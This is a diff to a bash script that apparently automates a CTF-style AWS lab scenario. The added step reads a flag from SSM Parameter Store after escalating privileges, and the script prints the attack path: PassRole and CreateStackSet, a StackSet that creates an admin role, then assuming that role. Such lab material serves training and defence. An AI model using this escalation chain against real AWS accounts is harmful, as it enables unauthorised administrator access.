@@ -327,12 +327,29 @@ else
 fi
 echo ""
 
+# [EXPLOIT]
+# Step 12: Capture the CTF flag
+# The escalated role has AdministratorAccess, which grants ssm:GetParameter implicitly.
+# Use those credentials to read the scenario flag from SSM Parameter Store.
+echo -e "${YELLOW}Step 12: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/cloudformation-003-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (limited permissions)"
@@ -342,12 +359,14 @@ echo "4. Created stack instances in account $ACCOUNT_ID, region $AWS_REGION"
 echo "5. StackSet used execution role to create: $ESCALATED_ROLE_NAME"
 echo "6. Assumed escalated role: $ESCALATED_ROLE_ARN"
 echo "7. Achieved: Administrator Access"
+echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER (PassRole + CreateStackSet)"
 echo -e "  → CloudFormation StackSet (using $EXECUTION_ROLE)"
 echo -e "  → Creates $ESCALATED_ROLE_NAME (with AdministratorAccess)"
 echo -e "  → Assume $ESCALATED_ROLE_NAME → Admin"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
